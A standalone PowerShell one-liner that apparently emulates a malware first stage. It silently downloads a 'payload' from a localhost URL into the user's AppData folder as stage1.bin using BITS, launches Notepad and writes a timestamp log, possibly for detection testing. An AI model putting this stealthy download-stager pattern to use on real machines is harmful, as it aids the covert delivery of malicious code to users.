
$PayloadUrl = "https://localhost:9001/assets/update.dat"; $DownloadPath = "$env:APPDATA\stage1.bin"; Start-BitsTransfer -Source $PayloadUrl -Destination $DownloadPath -ErrorAction SilentlyContinue; Start-Process -FilePath "notepad.exe" -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
